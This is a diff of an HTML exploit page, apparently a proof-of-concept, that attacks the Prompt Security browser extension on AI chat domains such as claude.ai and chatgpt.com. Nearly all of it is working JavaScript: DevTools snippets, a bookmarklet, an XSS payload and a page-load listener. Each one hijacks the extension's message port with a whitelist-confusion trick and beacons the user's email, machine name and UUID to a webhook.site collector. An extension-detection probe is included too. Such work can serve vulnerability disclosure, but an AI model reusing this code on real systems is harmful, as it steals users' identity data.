@@ -2,172 +2,197 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Phase 2 — Email Exfil Payload</title>
+    <title>Phase 2 — Email Exfil on AI Domain</title>
     <style>
-        body{background:#0a0a0a;color:#e0e0e0;font-family:monospace;padding:24px;margin:0}
-        h2{color:#7c3aed;margin-bottom:4px}
-        p{color:#888;font-size:13px;margin-bottom:20px}
-        .step{background:#111;border:1px solid #222;border-radius:8px;padding:18px;margin:12px 0}
-        .step-num{color:#7c3aed;font-weight:700;font-size:13px;margin-bottom:8px}
-        pre{background:#0a0a0a;border:1px solid #333;border-radius:6px;padding:14px;font-size:12px;color:#e0e0e0;white-space:pre-wrap;word-break:break-all;position:relative;margin:8px 0}
-        .copy-btn{position:absolute;top:8px;right:8px;background:#7c3aed;color:#fff;border:none;border-radius:4px;padding:4px 10px;font-size:11px;cursor:pointer}
-        .copy-btn:hover{background:#6d28d9}
-        .tag{display:inline-block;font-size:10px;padding:2px 6px;border-radius:4px;font-weight:700;margin-left:6px;vertical-align:middle}
-        .tag-works{background:#16a34a;color:#fff}
-        .tag-xss{background:#dc2626;color:#fff}
-        .warn{background:#1c1500;border:1px solid #f59e0b;border-radius:6px;padding:12px;color:#f59e0b;font-size:13px;margin:12px 0}
-        .ok{color:#16a34a}.err{color:#dc2626}.dim{color:#555}
-        #result{display:none;background:#111;border:1px solid #7c3aed;border-radius:8px;padding:16px;margin-top:16px}
-        #log{font-size:13px;line-height:1.6}
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{background:#0a0a0a;color:#e0e0e0;font-family:monospace;padding:24px}
+        h2{color:#7c3aed;margin-bottom:6px;font-size:18px}
+        .sub{color:#888;font-size:13px;margin-bottom:20px}
+        .step{background:#111;border:1px solid #222;border-radius:8px;padding:18px;margin:14px 0}
+        .step h3{font-size:13px;font-weight:700;margin-bottom:10px}
+        .step h3 .tag{display:inline-block;font-size:10px;padding:2px 7px;border-radius:4px;font-weight:700;margin-left:8px;vertical-align:middle}
+        .green{color:#16a34a}.red{color:#dc2626}.yellow{color:#f59e0b}.purple{color:#7c3aed}.dim{color:#555}
+        .bg-green{background:#16a34a;color:#fff}.bg-red{background:#dc2626;color:#fff}.bg-purple{background:#7c3aed;color:#fff}
+        pre{background:#0a0a0a;border:1px solid #333;border-radius:6px;padding:12px;font-size:12px;color:#e0e0e0;white-space:pre-wrap;word-break:break-all;margin:8px 0;position:relative}
+        .copy{position:absolute;top:6px;right:6px;background:#7c3aed;color:#fff;border:none;border-radius:4px;padding:3px 9px;font-size:11px;cursor:pointer}
+        .warn{background:#1c1500;border:1px solid #f59e0b;border-radius:6px;padding:12px;color:#f59e0b;font-size:12px;margin:10px 0}
+        #livePanel{display:none;background:#111;border:1px solid #7c3aed;border-radius:8px;padding:16px;margin-top:16px}
+        #liveLog{font-size:13px;line-height:1.7}
+        ol{padding-left:20px;margin:8px 0}
+        ol li{font-size:13px;color:#aaa;margin:5px 0;line-height:1.5}
+        ol li b{color:#e0e0e0}
+        kbd{background:#222;border:1px solid #444;border-radius:3px;padding:1px 5px;font-size:11px}
     </style>
 </head>
 <body>
-<h2>&#x26a0;&#xfe0f; Phase 2 — Email Exfil via Whitelist Confusion Bypass</h2>
-<p>This payload runs the Bypass A attack (port interception + type/message field confusion) on a monitored AI domain.
-Choose the delivery method that fits your scenario.</p>
 
-<div class="warn">
-&#x1f512; Email requires <code>getSiteActionConfig</code> via the MessageChannel port — only established when
-<code>script.bundle.js</code> is injected on a monitored domain (chatgpt.com, claude.ai, etc.).
-This page is on github.io (not monitored), so the port is not available here.
-Use one of the delivery methods below.
-</div>
-
-<!-- ═══════════════════════════════════════════════════════════ -->
-<div class="step">
-<div class="step-num">METHOD 1 — DevTools Snippet on claude.ai <span class="tag tag-works">WORKS NOW</span></div>
-<p style="color:#888;font-size:12px;margin:4px 0 10px">
-1. Open <b>chrome://newtab</b> → press <b>F12</b> to open DevTools (keep it open)<br>
-2. Go to the <b>Console</b> tab, paste the snippet below<br>
-3. Navigate the tab to <b>https://claude.ai</b> (or any monitored AI domain)<br>
-4. The snippet runs, intercepts the port as the page loads, exfils email to webhook
+<h2>⚠️ Phase 2 — Email Exfil via Whitelist Confusion (Bypass A)</h2>
+<p class="sub">
+    v7.1.5 patch analysis: <span class="red">onMessageExternal REMOVED</span> (Bypass D dead) ·
+    <span class="green">Port relay still vulnerable</span> (whitelist confusion) ·
+    Port only fires on monitored AI domains
 </p>
-<pre id="snippet1">window.addEventListener("message",function H(e){
-  if(!e.data||e.data.ps_rpc_port!==true||!e.ports||!e.ports[0])return;
-  var port=e.ports[0], token=e.data.token, id=crypto.randomUUID();
-  port.start();
-  port.onmessage=function(r){
-    if(r.data.messageId!==id)return;
-    navigator.sendBeacon("https://webhook.site/af9993fc-5721-40b1-818c-b73a3d61a039",
-      new Blob([JSON.stringify({phase:2,origin:location.origin,
-        email:r.data.response?.userInfo?.email,
-        machineName:r.data.response?.userInfo?.machineName,
-        uuid:r.data.response?.userInfo?.userUUID,
-        identitySource:r.data.response?.userInfo?.identitySource,
-        domainActions:r.data.response?.domainActions,
-        raw:r.data.response})],{type:"application/json"}));
-    console.log("%c[PS-EXFIL] Email:"+r.data.response?.userInfo?.email,"color:lime;font-weight:bold");
-  };
-  /* BYPASS A: whitelist sees "callProtectApi" (allowed)
-     background routes on type:"getSiteActionConfig" (privileged) */
-  port.postMessage({token:token,messageId:id,message:{
-    message:"callProtectApi",
-    type:"getSiteActionConfig",
-    domain:location.hostname,
-    ctx:{flowTraceId:crypto.randomUUID()}
-  }});
-});
-console.log("%c[PS-EXFIL] Listener ready. Navigate to claude.ai / chatgpt.com now.","color:#7c3aed");
-<button class="copy-btn" onclick="copy('snippet1')">Copy</button></pre>
+
+<!-- STATUS BOX -->
+<div id="statusBox" class="warn">
+    ⏳ Checking if port is available on this domain...
 </div>
 
-<!-- ═══════════════════════════════════════════════════════════ -->
+<!-- METHOD 1: DEVTOOLS BREAKPOINT -->
 <div class="step">
-<div class="step-num">METHOD 2 — Bookmarklet <span class="tag tag-works">WORKS NOW</span></div>
-<p style="color:#888;font-size:12px;margin:4px 0 10px">
-1. Drag the link below to your bookmarks bar<br>
-2. Open a <b>new tab</b> → type <code>claude.ai</code> in address bar (don't press Enter yet)<br>
-3. Click the bookmarklet — it registers the listener in the current blank page context<br>
-4. Press Enter to navigate to claude.ai<br>
-5. The listener fires when the extension injects script.bundle.js
-</p>
-<p style="color:#f59e0b;font-size:12px">&#x26a0; Drag this to bookmarks bar:</p>
-<a id="bookmarklet" href="javascript:void(window.addEventListener('message',function(e){if(!e.data||e.data.ps_rpc_port!==true||!e.ports||!e.ports[0])return;var p=e.ports[0],t=e.data.token,i=crypto.randomUUID();p.start();p.onmessage=function(r){if(r.data.messageId!==i)return;navigator.sendBeacon('https://webhook.site/af9993fc-5721-40b1-818c-b73a3d61a039',new Blob([JSON.stringify({phase:2,bookmarklet:true,origin:location.origin,email:r.data.response&&r.data.response.userInfo&&r.data.response.userInfo.email,machineName:r.data.response&&r.data.response.userInfo&&r.data.response.userInfo.machineName,uuid:r.data.response&&r.data.response.userInfo&&r.data.response.userInfo.userUUID,raw:r.data.response})],{type:'application/json'}));};p.postMessage({token:t,messageId:i,message:{message:'callProtectApi',type:'getSiteActionConfig',domain:location.hostname,ctx:{flowTraceId:crypto.randomUUID()}}});}));"
-   style="display:inline-block;background:#7c3aed;color:#fff;padding:8px 18px;border-radius:6px;text-decoration:none;font-weight:700;font-size:13px;margin:4px 0">
-    &#x1f4e6; PS-Steal Bookmark
-</a>
+<h3>METHOD 1 — DevTools XHR Breakpoint <span class="tag bg-green">WORKS — NO XSS NEEDED</span></h3>
+<ol>
+    <li>Open a <b>new Chrome tab</b></li>
+    <li>Press <kbd>F12</kbd> to open DevTools → go to <b>Sources</b> tab</li>
+    <li>In the right panel: <b>XHR/fetch Breakpoints</b> → click <b>+</b> → type <code>heartbeat</code> → Enter</li>
+    <li>In the <b>Console</b> tab, paste the snippet below and press Enter <em>(registers listener BEFORE page loads)</em></li>
+    <li>Navigate the tab to <b>https://claude.ai</b> (or chatgpt.com, gemini.google.com)</li>
+    <li>DevTools will pause when the extension heartbeat fires → continue with <kbd>F8</kbd></li>
+    <li>The port listener captures <code>ps_rpc_port</code> → email exfiled to webhook ✓</li>
+</ol>
+<pre id="s1">/* PASTE IN DEVTOOLS CONSOLE — then navigate to claude.ai */
+(function(){
+    window.__ps_exfil = true;
+    window.addEventListener("message", function H(e) {
+        if (!e.data || e.data.ps_rpc_port !== true || !e.ports || !e.ports[0]) return;
+        window.removeEventListener("message", H);
+        var port = e.ports[0], token = e.data.token;
+        port.start();
+        console.log("%c[PS-STEAL] Port captured! Token: " + token.slice(0,8) + "...", "color:lime;font-weight:bold");
+        var id = crypto.randomUUID();
+        port.onmessage = function(r) {
+            if (r.data.messageId !== id) return;
+            var ui = r.data.response && r.data.response.userInfo;
+            console.log("%c[PS-STEAL] EMAIL: " + (ui && ui.email), "color:lime;font-size:14px;font-weight:bold");
+            console.log("%c[PS-STEAL] MACHINE: " + (ui && ui.machineName), "color:lime");
+            console.log("%c[PS-STEAL] UUID: " + (ui && ui.userUUID), "color:lime");
+            navigator.sendBeacon("https://webhook.site/af9993fc-5721-40b1-818c-b73a3d61a039",
+                new Blob([JSON.stringify({
+                    phase: 2, method: "devtools_breakpoint",
+                    origin: location.origin,
+                    email: ui && ui.email,
+                    profileEmail: ui && ui.profileEmail,
+                    machineName: ui && ui.machineName,
+                    userUUID: ui && ui.userUUID,
+                    identitySource: ui && ui.identitySource,
+                    domainActions: r.data.response && r.data.response.domainActions,
+                    raw: r.data.response
+                })], {type:"application/json"}));
+        };
+        /* BYPASS A: whitelist sees "callProtectApi" ✓, background routes on type:"getSiteActionConfig" */
+        port.postMessage({token: token, messageId: id, message: {
+            message: "callProtectApi",
+            type: "getSiteActionConfig",
+            domain: location.hostname,
+            ctx: {flowTraceId: crypto.randomUUID()}
+        }});
+    });
+    console.log("%c[PS-STEAL] Listener ready. Navigate to claude.ai / chatgpt.com now.", "color:#7c3aed;font-weight:bold");
+})();
+<button class="copy" onclick="cp('s1')">Copy</button></pre>
 </div>
 
-<!-- ═══════════════════════════════════════════════════════════ -->
+<!-- METHOD 2: XSS PAYLOAD -->
 <div class="step">
-<div class="step-num">METHOD 3 — XSS Payload (if XSS on AI platform) <span class="tag tag-xss">XSS REQUIRED</span></div>
-<p style="color:#888;font-size:12px;margin:4px 0 10px">Inject into a monitored domain page that hasn't finished loading.</p>
-<pre id="snippet3">&lt;script&gt;
-window.addEventListener("message",function(e){
-  if(!e.data||e.data.ps_rpc_port!==true||!e.ports||!e.ports[0])return;
-  var port=e.ports[0],token=e.data.token,id=crypto.randomUUID();
-  port.start();
-  port.onmessage=function(r){
-    if(r.data.messageId!==id)return;
-    fetch("https://webhook.site/af9993fc-5721-40b1-818c-b73a3d61a039",{
-      method:"POST",headers:{"Content-Type":"application/json"},
-      body:JSON.stringify({phase:2,xss:true,origin:location.origin,
-        email:r.data.response?.userInfo?.email,
-        machineName:r.data.response?.userInfo?.machineName,
-        uuid:r.data.response?.userInfo?.userUUID,
-        raw:r.data.response}),mode:"no-cors"});
-  };
-  port.postMessage({token:token,messageId:id,message:{
-    message:"callProtectApi",type:"getSiteActionConfig",
-    domain:location.hostname,ctx:{flowTraceId:crypto.randomUUID()}
-  }});
+<h3>METHOD 2 — XSS / Script Injection on AI Platform <span class="tag bg-red">XSS REQUIRED</span></h3>
+<p style="color:#888;font-size:12px;margin:6px 0 10px">Inject into chatgpt.com, claude.ai, gemini.google.com, copilot.microsoft.com, etc.</p>
+<pre id="s2">&lt;script&gt;
+/* Injected via XSS — runs at page load, before ps_rpc_port fires */
+window.addEventListener("message", function H(e) {
+    if (!e.data || e.data.ps_rpc_port !== true || !e.ports || !e.ports[0]) return;
+    window.removeEventListener("message", H);
+    var port = e.ports[0], token = e.data.token, id = crypto.randomUUID();
+    port.start();
+    port.onmessage = function(r) {
+        if (r.data.messageId !== id) return;
+        var ui = r.data.response && r.data.response.userInfo;
+        fetch("https://webhook.site/af9993fc-5721-40b1-818c-b73a3d61a039", {
+            method: "POST", headers: {"Content-Type":"application/json"},
+            body: JSON.stringify({
+                phase: 2, method: "xss",
+                origin: location.origin,
+                email: ui && ui.email,
+                machineName: ui && ui.machineName,
+                userUUID: ui && ui.userUUID,
+                raw: r.data.response
+            }), mode: "no-cors"
+        });
+    };
+    port.postMessage({token: token, messageId: id, message: {
+        message: "callProtectApi",    /* whitelist check passes */
+        type: "getSiteActionConfig",  /* background routes here */
+        domain: location.hostname,
+        ctx: {flowTraceId: crypto.randomUUID()}
+    }});
 });
 &lt;/script&gt;
-<button class="copy-btn" onclick="copy('snippet3')">Copy</button></pre>
+<button class="copy" onclick="cp('s2')">Copy</button></pre>
 </div>
 
-<!-- ═══════════════════════════════════════════════════════════ -->
-<div id="result">
-    <div style="color:#7c3aed;font-weight:700;margin-bottom:8px">&#x1f4bb; Live Output</div>
-    <pre id="log">Waiting for port handshake...</pre>
+<!-- LIVE RESULT (if port fires here) -->
+<div id="livePanel">
+    <div style="color:#7c3aed;font-weight:700;margin-bottom:8px">📡 Live Capture</div>
+    <pre id="liveLog"></pre>
 </div>
 
 <script>
-function copy(id) {
+const EXFIL = "https://webhook.site/af9993fc-5721-40b1-818c-b73a3d61a039";
+const EXT_ID = "iidnankcocecmgpcafggbgbmkbcldmno";
+
+function ll(m, c) {
+    document.getElementById("livePanel").style.display = "block";
+    document.getElementById("liveLog").innerHTML +=
+        '\n<span style="color:' + (c||"#e0e0e0") + '">' + m + '</span>';
+}
+
+function cp(id) {
     const el = document.getElementById(id);
-    const text = el.childNodes[0].textContent.trim();
+    const text = el.childNodes[0].nodeValue.trim();
     navigator.clipboard.writeText(text).then(() => {
-        el.querySelector('.copy-btn').textContent = 'Copied!';
-        setTimeout(() => el.querySelector('.copy-btn').textContent = 'Copy', 2000);
+        const btn = el.querySelector('.copy');
+        btn.textContent = 'Copied!';
+        setTimeout(() => btn.textContent = 'Copy', 2000);
     });
 }
 
-// Also attempt Phase 2 live if port happens to be established on this domain
-const EXFIL = "https://webhook.site/af9993fc-5721-40b1-818c-b73a3d61a039";
-const log = (m, c="") => {
-    document.getElementById("result").style.display="block";
-    document.getElementById("log").innerHTML += `\n<span style="color:${c||'#e0e0e0'}">${m}</span>`;
+// Detect extension via image probe
+const img = new Image();
+img.onload = function() {
+    document.getElementById("statusBox").style.cssText =
+        "background:#0a1f0a;border:1px solid #16a34a;border-radius:6px;padding:12px;color:#16a34a;font-size:12px;margin:10px 0";
+    document.getElementById("statusBox").innerHTML =
+        "✅ Extension detected (prompt_logo.png loaded). Port will be available on: " +
+        "<b>chatgpt.com, claude.ai, gemini.google.com, copilot.microsoft.com</b> — use Method 1 or 2 above.";
 };
+img.onerror = function() {
+    document.getElementById("statusBox").innerHTML =
+        "❌ Extension not detected. Install Prompt Security extension first.";
+};
+img.src = "chrome-extension://" + EXT_ID + "/images/prompt_logo.png";
 
+// Also attempt live capture if port happens to fire on this page
 window.addEventListener("message", function(e) {
     if (!e.data || e.data.ps_rpc_port !== true || !e.ports || !e.ports[0]) return;
-    const port = e.ports[0], token = e.data.token;
+    var port = e.ports[0], token = e.data.token;
     port.start();
-    log("[steal.html] Port intercepted on: " + location.origin, "#7c3aed");
-    log("[steal.html] Token: " + token?.slice(0,12) + "...", "#555");
+    ll("[LIVE] Port intercepted! Token: " + token.slice(0,12) + "...", "#7c3aed");
 
-    const id = crypto.randomUUID();
+    var id = crypto.randomUUID();
     port.onmessage = function(r) {
         if (r.data.messageId !== id) return;
-        const ui = r.data.response?.userInfo;
-        log("[steal.html] EMAIL: " + (ui?.email || "N/A"), "#16a34a");
-        log("[steal.html] MACHINE: " + (ui?.machineName || "N/A"), "#16a34a");
-        log("[steal.html] UUID: " + (ui?.userUUID || "N/A"), "#16a34a");
-        log("[steal.html] API_KEY: " + (r.data.response?.apiKey || "checking..."), "#f59e0b");
-
-        fetch(EXFIL, { method:"POST", headers:{"Content-Type":"application/json"},
-            body:JSON.stringify({phase:2, origin:location.origin,
-                email: ui?.email, machineName: ui?.machineName,
-                userUUID: ui?.userUUID, identitySource: ui?.identitySource,
-                raw: r.data.response}), mode:"no-cors"}).catch(()=>{});
+        var ui = r.data.response && r.data.response.userInfo;
+        ll("[LIVE] EMAIL: " + (ui && ui.email || "N/A"), "#16a34a");
+        ll("[LIVE] MACHINE: " + (ui && ui.machineName || "N/A"), "#16a34a");
+        ll("[LIVE] UUID: " + (ui && ui.userUUID || "N/A"), "#16a34a");
+        fetch(EXFIL, {method:"POST", headers:{"Content-Type":"application/json"},
+            body: JSON.stringify({phase:2, method:"live", origin:location.origin,
+                email: ui && ui.email, machineName: ui && ui.machineName,
+                userUUID: ui && ui.userUUID, raw: r.data.response}),
+            mode:"no-cors"}).catch(()=>{});
     };
-
-    // BYPASS A: whitelist confusion
-    port.postMessage({ token, messageId: id, message: {
-        message: "callProtectApi",    // whitelist passes
-        type: "getSiteActionConfig",  // background routes here
-        domain: location.hostname,
-        ctx: { flowTraceId: crypto.randomUUID() }
+    port.postMessage({token:token, messageId:id, message:{
+        message:"callProtectApi", type:"getSiteActionConfig",
+        domain:location.hostname, ctx:{flowTraceId:crypto.randomUUID()}
     }});
 });
 </script>
